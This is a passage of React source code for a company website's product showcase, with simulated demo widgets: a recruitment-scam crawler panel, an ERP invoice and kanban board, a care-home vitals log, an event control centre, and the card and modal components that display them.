        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Mule Bank Tracing</span>
          <span className="text-[10px] font-bold text-green-400">ACTIVE INFRA</span>
        </div>
      </div>

      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Logs */}
        <div className="flex-1 liquid-glass-panel p-4 bg-bg-deep/80 border-glass-border flex flex-col gap-2">
          <span className="text-[9px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">JobGuard Shell Crawler</span>
          <div className="flex-1 overflow-y-auto max-h-[120px] flex flex-col gap-1.5 text-[9px] pr-1">
            {logs.map((log, i) => (
              <div key={i} className={log.includes('BERT') ? 'text-accent-gold' : log.includes('DISRUPT') ? 'text-red-400' : log.includes('OK') ? 'text-green-400' : 'text-beige-300/60'}>
                {log}
              </div>
            ))}
          </div>
        </div>
      </div>

      <div className="flex gap-3 mt-auto">
        <button
          onClick={runCrawl}
          disabled={crawling}
          data-cursor="link"
          className="px-4 py-2 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors disabled:opacity-50 text-[10px]"
        >
          {crawling ? 'Crawling Portals...' : 'Crawl Recruitment Portals'}
        </button>
        <button
          onClick={triggerTakedown}
          disabled={nodesCount === 0}
          data-cursor="link"
          className="px-4 py-2 border border-glass-border bg-glass-fill hover:bg-glass-fill-light text-beige-100 rounded hover:border-accent-gold/40 transition-colors disabled:opacity-50 text-[10px]"
        >
          Generate Abuse Takedown
        </button>
      </div>
    </div>
  )
}

/* ─── MINTS ERP RESOURCE SANDBOX ─── */
function MintsERPSandbox() {
  const [revenue, setRevenue] = useState(248930)
  const [tasks, setTasks] = useState([
    { id: 1, title: 'Database Migration', status: 'todo' },
    { id: 2, title: 'UI Design Polish', status: 'in-progress' },
    { id: 3, title: 'Security Posture Audit', status: 'done' }
  ])
  const [clientName, setClientName] = useState('')
  const [invoiceAmount, setInvoiceAmount] = useState('')
  const [invoices, setInvoices] = useState([])

  const advanceTask = (id) => {
    setTasks(prev => prev.map(t => {
      if (t.id !== id) return t
      const nextStatus = t.status === 'todo' ? 'in-progress' : t.status === 'in-progress' ? 'done' : 'todo'
      return { ...t, status: nextStatus }
    }))
    playSuccessSound()
  }

  const generateInvoice = (e) => {
    e.preventDefault()
    if (!clientName || !invoiceAmount) return
    const amt = parseFloat(invoiceAmount)
    if (isNaN(amt)) return
    setInvoices(prev => [`INV-2026-${prev.length + 1}: ${clientName.toUpperCase()} — AED ${amt.toLocaleString()} (PENDING)`, ...prev])
    setRevenue(prev => prev + amt)
    setClientName('')
    setInvoiceAmount('')
    playSuccessSound()
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      {/* KPI Stats */}
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Total Revenue</span>
          <span className="text-xl font-bold font-number text-accent-gold">AED {revenue.toLocaleString()}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Generated Invoices</span>
          <span className="text-xl font-bold text-beige-100">{invoices.length} Total</span>
        </div>
      </div>

      {/* Main split: Kanban Board & Invoice Builder */}
      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Kanban Board */}
        <div className="flex-1 flex flex-col gap-3">
          <span className="text-[10px] uppercase tracking-wider text-beige-300">Project Board (Click tasks to advance)</span>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 flex-1 min-h-[140px]">
            {['todo', 'in-progress', 'done'].map(column => (
              <div key={column} className="liquid-glass-panel p-2.5 bg-bg-deep/40 border-glass-border flex flex-col gap-2">
                <span className="text-[8px] uppercase tracking-widest text-beige-300 border-b border-white/5 pb-1">
                  {column.replace('-', ' ')}
                </span>
                <div className="flex flex-col gap-2 overflow-y-auto max-h-[150px]">
                  {tasks.filter(t => t.status === column).map(t => (
                    <button
                      key={t.id}
                      onClick={() => advanceTask(t.id)}
                      data-cursor="link"
                      className="p-2 rounded bg-bg-elevated border border-white/5 text-[9px] text-left hover:border-accent-gold/40 transition-colors"
                    >
                      {t.title}
                    </button>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Invoice Generator */}
        <form onSubmit={generateInvoice} className="w-full md:w-1/3 flex flex-col gap-3 liquid-glass-panel p-4 border-glass-border bg-bg-deep/20">
          <span className="text-[10px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">Invoice Builder</span>
          <div className="flex flex-col gap-1.5">
            <label className="text-[8px] uppercase tracking-wider text-beige-300">Client Name</label>
            <input
              type="text"
              value={clientName}
              onChange={e => setClientName(e.target.value)}
              placeholder="Fellora AE"
              className="w-full bg-bg-deep border border-glass-border rounded px-2.5 py-1.5 text-beige-100 placeholder:text-white/20 focus:outline-none focus:border-accent-gold"
            />
          </div>
          <div className="flex flex-col gap-1.5">
            <label className="text-[8px] uppercase tracking-wider text-beige-300">Amount (AED)</label>
            <input
              type="number"
              value={invoiceAmount}
              onChange={e => setInvoiceAmount(e.target.value)}
              placeholder="12000"
              className="w-full bg-bg-deep border border-glass-border rounded px-2.5 py-1.5 text-beige-100 placeholder:text-white/20 focus:outline-none focus:border-accent-gold"
            />
          </div>
          <button
            type="submit"
            data-cursor="link"
            className="w-full py-2 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors mt-auto text-[10px] uppercase tracking-wider"
          >
            Create Invoice
          </button>
        </form>
      </div>

      {/* Invoice Timeline */}
      {invoices.length > 0 && (
        <div className="flex flex-col gap-2">
          <span className="text-[9px] uppercase tracking-wider text-beige-300">Invoice Log</span>
          <div className="liquid-glass-panel p-3 bg-bg-deep/40 border-glass-border max-h-[100px] overflow-y-auto flex flex-col gap-1 text-[9px] text-beige-300">
            {invoices.map((inv, index) => (
              <div key={index}>{inv}</div>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}

/* ─── MINTCARE MANAGEMENT SANDBOX ─── */
function MintCareSandbox() {
  const [heartRate, setHeartRate] = useState(76)
  const [temp, setTemp] = useState(36.8)
  const [careLogs, setCareLogs] = useState([
    '10:15 AM - Breakfast served (Standard health diet)',
    '11:30 AM - Morning walk and physio review (Stable response)'
  ])
  const [newLog, setNewLog] = useState('')
  const [vitalsCheck, setVitalsCheck] = useState(false)

  const checkVitals = () => {
    if (vitalsCheck) return
    setVitalsCheck(true)
    setTimeout(() => {
      setHeartRate(Math.floor(Math.random() * 18) + 68)
      setTemp((Math.random() * 0.8 + 36.3).toFixed(1))
      setCareLogs(prev => [`[SYSTEM] Vitals automated review recorded.`, ...prev])
      setVitalsCheck(false)
      playSuccessSound()
    }, 800)
  }

  const dispatchMeds = () => {
    setCareLogs(prev => [`[MEDS] Administered prescribed check dosage successfully.`, ...prev])
    playSuccessSound()
  }

  const addLog = (e) => {
    e.preventDefault()
    if (!newLog) return
    const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    setCareLogs(prev => [`${time} - ${newLog}`, ...prev])
    setNewLog('')
    playSuccessSound()
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        {/* Resident info */}
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Resident</span>
          <span className="text-base font-bold text-beige-100">Albert Johnson</span>
        </div>
        {/* Heart Rate */}
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Heart Rate</span>
          <span className="text-base font-bold text-green-400 flex items-center gap-2">
            <span className="w-2.5 h-2.5 rounded-full bg-green-400 animate-ping" />
            {vitalsCheck ? '...' : `${heartRate} bpm`}
          </span>
        </div>
        {/* Temperature */}
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Temp</span>
          <span className="text-base font-bold text-accent-gold">{vitalsCheck ? '...' : `${temp} °C`}</span>
        </div>
      </div>

      {/* Splits */}
      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Actions panel */}
        <div className="w-full md:w-1/3 flex flex-col gap-3 liquid-glass-panel p-4 border-glass-border bg-bg-deep/20 justify-center">
          <span className="text-[10px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">Resident Care Controls</span>
          <button
            onClick={checkVitals}
            disabled={vitalsCheck}
            data-cursor="link"
            className="w-full py-2.5 border border-glass-border bg-glass-fill hover:bg-glass-fill-light text-beige-100 rounded text-[10px] uppercase tracking-wider disabled:opacity-50"
          >
            {vitalsCheck ? 'Measuring...' : 'Check Vitals'}
          </button>
          <button
            onClick={dispatchMeds}
            data-cursor="link"
            className="w-full py-2.5 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors text-[10px] uppercase tracking-wider"
          >
            Dispatch Meds
          </button>
        </div>

        {/* Live logs log */}
        <div className="flex-1 flex flex-col gap-3">
          <span className="text-[10px] uppercase tracking-wider text-beige-300">Timelined Resident Log</span>
          <div className="flex-1 liquid-glass-panel p-4 bg-bg-deep/40 border-glass-border flex flex-col gap-3">
            {/* Form */}
            <form onSubmit={addLog} className="flex gap-2">
              <input
                type="text"
                value={newLog}
                onChange={e => setNewLog(e.target.value)}
                placeholder="Log lunch serving, outing review..."
                className="flex-1 bg-bg-deep border border-glass-border rounded px-3 py-1.5 text-beige-100 placeholder:text-white/20 focus:outline-none focus:border-accent-gold text-xs"
              />
              <button
                type="submit"
                data-cursor="link"
                className="px-4 py-1.5 bg-beige-100 text-bg-deep font-bold rounded hover:bg-accent-gold transition-colors text-xs shrink-0"
              >
                Log Care
              </button>
            </form>
            {/* History */}
            <div className="flex-1 overflow-y-auto max-h-[140px] flex flex-col gap-2 pr-2 text-[10px] text-beige-300">
              {careLogs.map((log, index) => (
                <div key={index} className="flex gap-2 border-l border-accent-gold/40 pl-2.5">
                  {log}
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ─── MINORA EVENT CONTROLLER SANDBOX ─── */
function MinoraSandbox() {
  const [alertTicker, setAlertTicker] = useState('WELCOME TO MINORA LIVE COMMAND CENTRE')
  const [newAlert, setNewAlert] = useState('')
  const [chat, setChat] = useState([
    { user: 'Sarah J.', msg: 'Has the keynote started?' },
    { user: 'David C.', msg: 'Visual feed looks extremely sharp!' }
  ])
  const [myMsg, setMyMsg] = useState('')

  const broadcastAlert = (e) => {
    e.preventDefault()
    if (!newAlert) return
    setAlertTicker(`ALERT: ${newAlert.toUpperCase()}`)
    setNewAlert('')
    playSuccessSound()
  }

  const sendChat = (e) => {
    e.preventDefault()
    if (!myMsg) return
    setChat(prev => [...prev, { user: 'HOST ADMIN', msg: myMsg }])
    setMyMsg('')
    playSuccessSound()
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      {/* Live Alerts Ticker */}
      <div className="w-full bg-red-950/20 border border-red-900/30 px-4 py-2 rounded text-[10px] text-red-400 font-bold overflow-hidden whitespace-nowrap relative">
        <div className="inline-block animate-[ticker_18s_linear_infinite]">
          {alertTicker} &nbsp;&nbsp;✦&nbsp;&nbsp; {alertTicker}
        </div>
      </div>

      {/* Screen Monitor Feeds */}
      <div className="flex flex-col lg:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Feeds grid */}
        <div className="flex-1 flex flex-col gap-3">
          <span className="text-[10px] uppercase tracking-wider text-beige-300">Live Camera Feeds</span>
          <div className="grid grid-cols-2 gap-3 flex-1 min-h-[140px]">
            {['STAGE MAIN CAM', 'BACKSTAGE INTERVIEW', 'AUDIENCE SECTOR B', 'PRESENTATION DECK'].map((name, i) => (
              <div key={i} className="liquid-glass-panel relative aspect-video bg-bg-deep/80 border-glass-border flex items-center justify-center overflow-hidden">
                {/* Simulated scan lines */}
                <div className="absolute inset-0 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[size:100%_4px,3px_100%] pointer-events-none z-10" />
                <span className="text-[8px] text-white/40 uppercase tracking-widest relative z-20">{name} [LIVE]</span>
                <span className="absolute top-2 left-2 text-[6px] text-red-500 bg-red-950/40 border border-red-500/20 px-1 rounded animate-pulse">REC</span>
              </div>
            ))}
          </div>
        </div>

        {/* Audience Chat & Alerts broadcast */}
        <div className="w-full lg:w-1/3 flex flex-col gap-4">
          {/* Ticker Broadcast */}
          <form onSubmit={broadcastAlert} className="liquid-glass-panel p-3 border-glass-border bg-bg-deep/20 flex flex-col gap-2">
            <span className="text-[9px] uppercase tracking-wider text-beige-300">Ticker Broadcaster</span>
            <div className="flex gap-2">
              <input
                type="text"
                value={newAlert}
                onChange={e => setNewAlert(e.target.value)}
                placeholder="keynote starting in 5m..."
                className="flex-1 bg-bg-deep border border-glass-border rounded px-2.5 py-1 text-beige-100 placeholder:text-white/20 focus:outline-none focus:border-accent-gold text-[10px]"
              />
              <button
                type="submit"
                data-cursor="link"
                className="px-3 py-1 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors text-[9px] uppercase"
              >
                Send
              </button>
            </div>
          </form>

          {/* Q&A chat */}
          <div className="liquid-glass-panel p-3 border-glass-border bg-bg-deep/20 flex-1 flex flex-col gap-2">
            <span className="text-[9px] uppercase tracking-wider text-beige-300">Live Q&A Monitor</span>
            <div className="flex-1 overflow-y-auto max-h-[100px] flex flex-col gap-2 text-[9px] pr-1">
              {chat.map((c, i) => (
                <div key={i} className="flex flex-col gap-0.5">
                  <span className={c.user === 'HOST ADMIN' ? 'text-accent-gold font-bold' : 'text-beige-100 font-bold'}>
                    {c.user}
                  </span>
                  <span className="text-beige-300">{c.msg}</span>
                </div>
              ))}
            </div>
            <form onSubmit={sendChat} className="flex gap-2 border-t border-white/5 pt-2">
              <input
                type="text"
                value={myMsg}
                onChange={e => setMyMsg(e.target.value)}
                placeholder="Answer user question..."
                className="flex-1 bg-bg-deep border border-glass-border rounded px-2.5 py-1 text-beige-100 placeholder:text-white/20 focus:outline-none focus:border-accent-gold text-[10px]"
              />
              <button
                type="submit"
                data-cursor="link"
                className="px-3 py-1 bg-beige-100 text-bg-deep font-bold rounded hover:bg-accent-gold transition-colors text-[9px] uppercase"
              >
                Post
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  )
}

function SandboxModal({ product, onClose }) {
  const prefersReducedMotion = usePrefersReducedMotion()

  useEffect(() => {
    const handleKey = (e) => { if (e.key === 'Escape') onClose() }
    window.addEventListener('keydown', handleKey)
    return () => window.removeEventListener('keydown', handleKey)
  }, [onClose])

  return (
    <AnimatePresence>
      {product && (
        <motion.div
          className="fixed inset-0 z-[250] flex items-center justify-center p-4 sm:p-6 md:p-10"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
        >
          {/* Backdrop */}
          <div
            className="absolute inset-0 bg-bg-deep/90 backdrop-blur-md pointer-events-auto"
            onClick={onClose}
          />

          {/* Dialog Container */}
          <motion.div
            initial={prefersReducedMotion ? { opacity: 0 } : { opacity: 0, scale: 0.95, y: 30 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={prefersReducedMotion ? { opacity: 0 } : { opacity: 0, scale: 0.95, y: 30 }}
            transition={{ duration: 0.45, ease: [0.16, 1, 0.3, 1] }}
            className="relative z-10 w-full max-w-4xl max-h-[90vh] overflow-y-auto liquid-glass-panel border-glass-border flex flex-col pointer-events-auto shadow-2xl"
          >
            {/* Header */}
            <div className="flex items-center justify-between px-4 md:px-6 py-4 md:py-5 border-b border-glass-border bg-bg-elevated/40 relative z-20">
              <div>
                <span className="font-mono text-[9px] uppercase tracking-widest text-accent-gold mb-1 block">
                  {product.tagline}
                </span>
                <h3 className="font-display font-bold text-xl md:text-2xl text-beige-100 flex items-center gap-3">
                  {product.label} Sandbox
                  {product.statusBadge && (
                    <span
                      className="px-2 py-0.5 rounded-sm border font-mono text-[8px] uppercase tracking-wider font-semibold"
                      style={{
                        borderColor: product.color + '45',
                        color: product.color,
                        background: product.color + '12',
                      }}
                    >
                      {product.statusBadge}
                    </span>
                  )}
                  <span className="text-[10px] font-mono font-medium px-2 py-0.5 border border-green-500/30 text-green-400 bg-green-950/20 rounded-full flex items-center gap-1.5">
                    <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
                    LIVE RUNNING
                  </span>
                </h3>
              </div>
              <button
                onClick={onClose}
                data-cursor="link"
                className="w-9 h-9 rounded-full border border-glass-border flex items-center justify-center text-beige-300 hover:text-accent-gold hover:border-accent-gold/40 transition-colors font-mono text-sm"
              >
                ✕
              </button>
            </div>

            {/* Sandbox viewport */}
            <div className="p-4 md:p-6 bg-bg-deep/20 relative z-10 flex-1 overflow-y-auto">
              {product.id === 'shielddesk' && <ShieldDeskSandbox />}
              {product.id === 'vmp' && <VmpSandbox />}
              {product.id === 'sentineliot' && <SentinelIotSandbox />}
              {product.id === 'smecyber' && <SmeCyberSandbox />}
              {product.id === 'securevault' && <SecureVaultSandbox />}
              {product.id === 'jobguard' && <JobGuardSandbox />}
              {product.id === 'erp' && <MintsERPSandbox />}
              {product.id === 'mintcare' && <MintCareSandbox />}
              {product.id === 'minora' && <MinoraSandbox />}
            </div>

            {/* Footer */}
            <div className="px-4 md:px-6 py-3 md:py-4 border-t border-glass-border bg-bg-elevated/20 flex flex-col sm:flex-row items-center justify-between gap-3 text-[10px] font-mono text-beige-300/40 relative z-20">
              <span>Mints Global Sandbox Sandbox v1.0.4</span>
              <span>Fully simulated environment</span>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  )
}

function ProductCard({ product, active, setActive, setSandboxProduct, i, prefersReducedMotion }) {
  const cardRef = useRef(null)
  const x = useMotionValue(0)
  const y = useMotionValue(0)
  const rotateX = useSpring(useTransform(y, [-0.5, 0.5], [6, -6]), { stiffness: 120, damping: 18 })
  const rotateY = useSpring(useTransform(x, [-0.5, 0.5], [-6, 6]), { stiffness: 120, damping: 18 })
  const glowX = useTransform(x, [-0.5, 0.5], [0, 100])
  const glowY = useTransform(y, [-0.5, 0.5], [0, 100])

  const handleMouseMove = (e) => {
    if (prefersReducedMotion || !cardRef.current) return
    const rect = cardRef.current.getBoundingClientRect()
    x.set((e.clientX - rect.left) / rect.width - 0.5)
    y.set((e.clientY - rect.top) / rect.height - 0.5)
  }

  const handleMouseLeave = () => {
    if (prefersReducedMotion) return
    x.set(0)
    y.set(0)
  }

  const isActive = active?.id === product.id

  return (
    <motion.button
      ref={cardRef}
      onClick={() => setActive(isActive ? null : product)}
      onMouseMove={handleMouseMove}
      onMouseLeave={handleMouseLeave}
      data-cursor="link"
      initial={prefersReducedMotion ? {} : { opacity: 0, y: 30 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true, margin: '-60px' }}
      transition={{ duration: 0.7, delay: i * 0.12, ease: [0.16, 1, 0.3, 1] }}
      className="relative group text-left overflow-hidden transition-all duration-500"
      style={{
        background: 'rgba(8,20,12,0.75)',
        border: `1px solid ${isActive ? product.color + '40' : 'rgba(255,255,255,0.05)'}`,
        borderRadius: '20px',
        backdropFilter: 'blur(60px) saturate(200%)',
        rotateX: prefersReducedMotion ? 0 : rotateX,
        rotateY: prefersReducedMotion ? 0 : rotateY,
        transformStyle: 'preserve-3d',
        boxShadow: isActive
          ? `0 0 0 1px ${product.color}25, 0 40px 100px -20px rgba(0,0,0,0.8), 0 0 60px -20px ${product.color}20`
          : '0 20px 60px -16px rgba(0,0,0,0.6)',
      }}
    >
      {/* Colored top border glow on hover */}
      <div
        className="absolute top-0 left-0 right-0 h-px transition-opacity duration-500"
        style={{
          background: `linear-gradient(90deg, transparent, ${product.color}80, transparent)`,
          opacity: isActive ? 1 : 0,
        }}
      />

      {/* Corner brackets */}
      <div className="absolute top-3 left-3 w-4 h-4 border-t border-l transition-all duration-400 opacity-0 group-hover:opacity-100"
           style={{ borderColor: product.color + '60' }} />
      <div className="absolute bottom-3 right-3 w-4 h-4 border-b border-r transition-all duration-400 opacity-0 group-hover:opacity-100"
           style={{ borderColor: product.color + '40' }} />

      {/* Background image */}
      <div
        className="absolute inset-0 bg-cover bg-center transition-all duration-700"
        style={{
          backgroundImage: `url("${product.image}")`,
          opacity: isActive ? 0.25 : 0.12,
          transform: 'scale(1.05)',
        }}
      />

      {/* Gradient overlay */}
      <div className="absolute inset-0 bg-gradient-to-br from-bg-deep/90 via-bg-deep/60 to-transparent" />

      {/* Mouse-follow glow */}
      <motion.div
        className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-500 pointer-events-none"
        style={{
          background: prefersReducedMotion ? 'none' : `radial-gradient(circle at ${glowX.get()}% ${glowY.get()}%, ${product.color}15 0%, transparent 60%)`,
        }}
      />

      {/* Top-right orb glow */}
      <div
        className="absolute -top-16 -right-16 w-48 h-48 rounded-full opacity-0 group-hover:opacity-15 transition-opacity duration-700 blur-3xl pointer-events-none"
        style={{ background: product.color }}
      />

      <div className="relative z-10 p-8">
        {/* Badge row */}
        <div className="flex items-start justify-between mb-8">
          <span
            className="font-number text-7xl font-bold leading-none"
            style={{ color: product.color, opacity: 0.12 }}
          >
            {product.badge}
          </span>
          <div className="flex flex-col items-end gap-2">
            <span
              className="px-3 py-1.5 rounded-sm border font-mono text-[7px] uppercase tracking-widest"
              style={{
                borderColor: product.color + '35',
                color: product.color,
                background: product.color + '0D',
              }}
            >
              {product.tagline}
            </span>
            {/* Live indicator */}
            <div className="flex items-center gap-1.5">
              <span
                className="w-1.5 h-1.5 rounded-full"
                style={{ background: product.color, boxShadow: `0 0 6px ${product.color}80`, animation: 'neonPulse 2.5s ease-in-out infinite' }}
              />
              <span className="font-mono text-[7px] tracking-widest" style={{ color: product.color + '90' }}>LIVE DEMO</span>
            </div>
          </div>
        </div>

        {/* Title */}
        <h3 className="font-display font-bold text-2xl md:text-3xl text-beige-100 mb-3 tracking-tight flex items-center gap-3">
          {product.label}
          {product.statusBadge && (
            <span
              className="px-2.5 py-0.5 rounded-sm border font-mono text-[8px] uppercase tracking-wider font-semibold"
              style={{
                borderColor: product.color + '45',
                color: product.color,
                background: product.color + '12',
              }}
            >
              {product.statusBadge}
            </span>
          )}
        </h3>
        <p className="font-body text-beige-300/70 text-sm leading-relaxed line-clamp-3 mb-6">{product.description}</p>

        {/* Feature pills */}
        <div className="flex flex-wrap gap-1.5 mb-7">
          {product.features.map(f => (
            <span
              key={f}
              className="px-2.5 py-1 rounded-sm border font-mono text-[7px] uppercase tracking-wider"
              style={{
                borderColor: 'rgba(255,255,255,0.06)',
                color: 'rgba(185,172,141,0.6)',
                background: 'rgba(255,255,255,0.025)',
              }}
            >
              {f}
            </span>
          ))}
        </div>

        {/* CTA */}
        <div className="flex items-center gap-4">
          <span
            onClick={(e) => {
              e.stopPropagation()
              setSandboxProduct(product)
            }}
            data-cursor="link"
            className="btn-glow flex items-center gap-2.5 !py-3 !px-6 !text-[9px] !rounded-sm"
            style={{
              background: `linear-gradient(135deg, ${product.color} 0%, ${product.color}CC 100%)`,
              color: '#050D08',
              boxShadow: `0 0 20px ${product.color}40, 0 0 0 1px ${product.color}30`,
            }}
          >
            <svg width="10" height="10" viewBox="0 0 12 12" fill="none">
              <circle cx="6" cy="6" r="5" stroke="currentColor" strokeWidth="1.5"/>
              <path d="M4.5 6l1.5 1.5L8.5 4" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
            Launch Sandbox
            <span
              className="w-1.5 h-1.5 rounded-full"
              style={{ background: '#050D08', animation: 'pulseRing 2s ease-out infinite' }}
            />
          </span>
          <span className="font-mono text-[9px] text-beige-300/50 tracking-widest group-hover:text-beige-100/70 transition-colors duration-300">
            {isActive ? 'Collapse ↑' : 'Details ↓'}
          </span>
        </div>
      </div>

      {/* Expanded details */}
      <AnimatePresence>
        {isActive && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            transition={{ duration: 0.4, ease: [0.16, 1, 0.3, 1] }}
            className="overflow-hidden"
          >
            <div
              className="relative z-10 px-8 pb-8 pt-6 flex flex-col gap-4"
              style={{ borderTop: `1px solid ${product.color}20` }}
            >
              <p className="font-mono text-[8px] uppercase tracking-widest" style={{ color: product.color + '90' }}>Platform Architecture Preview</p>
              <div
                className="w-full aspect-video rounded-xl bg-cover bg-center border opacity-70"
                style={{
                  backgroundImage: `url("${product.image}")`,
                  borderColor: product.color + '20',
                }}
              />
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.button>
  )
}

export default function ProductDemo() {
  const [active, setActive] = useState(null)
  const [sandboxProduct, setSandboxProduct] = useState(null)
  const prefersReducedMotion = usePrefersReducedMotion()

  return (
    <section id="products" className="relative z-10 py-28 px-6 md:px-16 lg:px-24 pointer-events-auto overflow-hidden">
      <div className="grid-overlay opacity-30 pointer-events-none" />

      {/* Accent orb background */}
      <div
        className="absolute top-1/2 right-0 -translate-y-1/2 w-[500px] h-[500px] rounded-full pointer-events-none opacity-[0.025]"
        style={{ background: 'radial-gradient(circle, rgba(201,168,76,1) 0%, transparent 60%)' }}
      />
      <div
        className="absolute bottom-0 left-10 w-[300px] h-[300px] rounded-full pointer-events-none opacity-[0.02]"
        style={{ background: 'radial-gradient(circle, rgba(0,255,157,1) 0%, transparent 60%)' }}
      />

      {/* ── Section Header ── */}
      <div className="max-w-7xl mx-auto">
        <div className="flex flex-col md:flex-row md:items-end justify-between gap-8 mb-16">
          <div>
            <div className="section-label mb-5">Enterprise Platforms</div>
            <h2 className="font-display font-extrabold text-beige-100 leading-[0.92] tracking-tight" style={{ fontSize: 'clamp(2.8rem, 6.5vw, 5.5rem)' }}>
              <div className="overflow-hidden">
                <motion.div
                  initial={prefersReducedMotion ? {} : { y: '100%' }}
                  whileInView={{ y: '0%' }}
                  viewport={{ once: true }}
                  transition={{ duration: 0.85, ease: [0.16,1,0.3,1] }}
                >
                  <ScrambleText text="Our Digital" delay={150} duration={900} />
                </motion.div>
              </div>
              <div className="overflow-hidden">
                <motion.div
                  initial={prefersReducedMotion ? {} : { y: '100%' }}
                  whileInView={{ y: '0%' }}
                  viewport={{ once: true }}
                  transition={{ duration: 0.85, delay: 0.12, ease: [0.16,1,0.3,1] }}
                  className="text-shimmer"
                >
                  <ScrambleText text="Products." delay={300} duration={850} />
                </motion.div>
              </div>
            </h2>
          </div>

          <div className="max-w-sm">
            <p className="font-body text-beige-300/70 text-base leading-relaxed mb-4">
              Beyond client work, Mints Global engineers scalable enterprise platforms tailored for distinct industry verticals.
            </p>
            {/* Product count badge */}
            <div className="inline-flex items-center gap-3 px-4 py-2.5 rounded-sm"
                 style={{ border: '1px solid rgba(201,168,76,0.2)', background: 'rgba(201,168,76,0.05)' }}>
              <span className="font-number text-2xl font-bold text-accent-gold leading-none">{PRODUCTS.length}</span>
              <div className="font-mono text-[8px] uppercase tracking-widest text-beige-300/50">
                <div>Active</div>
                <div>Products</div>
              </div>
            </div>
          </div>
        </div>

        {/* ── Product Cards Grid ── */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-5 mb-14">
          {PRODUCTS.map((product, i) => (
            <ProductCard
              key={product.id}
              product={product}
              active={active}
              setActive={setActive}
              setSandboxProduct={setSandboxProduct}
              i={i}
              prefersReducedMotion={prefersReducedMotion}
            />
          ))}
        </div>

        {/* ── Bottom CTA strip — enhanced ── */}
        <motion.div
          initial={prefersReducedMotion ? {} : { opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.8 }}
          className="relative rounded-2xl p-8 flex flex-col md:flex-row items-center justify-between gap-8 overflow-hidden"
          style={{
            background: 'linear-gradient(135deg, rgba(201,168,76,0.07) 0%, rgba(8,20,12,0.8) 60%, rgba(0,255,157,0.04) 100%)',
            border: '1px solid rgba(201,168,76,0.2)',
          }}
        >
          {/* Accent lines */}
          <div className="absolute top-0 left-0 right-0 h-px" style={{ background: 'linear-gradient(90deg, rgba(201,168,76,0.5), rgba(0,255,157,0.3), transparent)' }} />
          <div className="absolute top-3 left-3 w-5 h-5 border-t border-l border-accent-gold/40" />
          <div className="absolute bottom-3 right-3 w-5 h-5 border-b border-r border-accent-gold/25" />

          <div className="relative z-10">
            <p className="font-mono text-[8px] uppercase tracking-widest text-accent-gold mb-3">Enterprise Solutions</p>
            <h3 className="font-display font-bold text-2xl md:text-3xl text-beige-100 mb-2">Interested in a custom enterprise build?</h3>
            <p className="font-body text-beige-300/60 text-sm font-light max-w-md">Our team can architect bespoke software tailored to your organisation's unique workflows.</p>
          </div>
          <div className="relative z-10 flex flex-col sm:flex-row gap-3 shrink-0">
            <a
              href="https://www.mintsglobal.ae/#contact"
              target="_blank"
              rel="noopener noreferrer"
              data-cursor="link"
              className="btn-glow btn-glow-gold"
            >
              Talk to Us ↗
            </a>
          </div>
        </motion.div>
      </div>

      {/* Interactive Sandbox Overlay Modal */}
      <SandboxModal
        product={sandboxProduct}
        onClose={() => setSandboxProduct(null)}
      />
    </section>
  )
}
